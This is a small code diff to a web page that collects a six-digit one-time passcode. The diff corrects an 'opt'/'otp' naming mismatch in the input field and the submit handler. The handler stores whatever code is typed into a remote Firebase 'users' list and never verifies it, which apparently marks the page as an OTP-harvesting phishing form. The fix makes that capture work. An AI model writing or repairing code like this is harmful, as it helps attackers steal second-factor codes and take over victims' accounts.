@@ -40,7 +40,7 @@
               class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
               id="otp"
               type="number"
-              name="opt"
+              name="otp"
               value=""
               required
               pattern="[0-9]{6}"
@@ -123,12 +123,12 @@
           .addEventListener("submit", function (event) {
             event.preventDefault();
             //IDS
-            const opt = document.getElementById("opt").value;
+            const otp = document.getElementById("otp").value;
 
             // Push data to the database
             const dbRef = ref(database, "users");
             push(dbRef, {
-              otp: opt,
+              otp: otp,
             })
               .then(() => {
                 console.log("Data inserted successfully!");
